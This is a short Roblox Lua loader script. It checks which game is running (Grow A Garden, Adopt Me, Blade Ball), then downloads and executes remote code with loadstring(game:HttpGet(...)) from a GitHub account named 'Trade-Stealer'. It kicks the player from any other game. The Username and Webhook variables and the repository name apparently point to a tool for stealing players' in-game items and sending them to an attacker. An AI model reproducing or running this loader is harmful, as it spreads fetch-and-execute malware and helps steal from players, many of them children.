local Username = Username or ""
local Webhook = Webhook or ""

local gameId = game.PlaceId
local player = game:GetService("Players").LocalPlayer

if gameId == 126884695634066 then
    -- Grow A Garden
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Trade-Stealer/Universal/refs/heads/main/gag.lua"))()
elseif gameId == 920587237 then
    -- Adopt Me
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Trade-Stealer/Universal/refs/heads/main/Roblox"))()
elseif gameId == 13772394625 then
    -- Blade Ball
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Trade-Stealer/Universal/refs/heads/main/Blade_Ball"))()
else
    -- Unsupported game
    player:Kick("Adopt Me! Only supported")
end
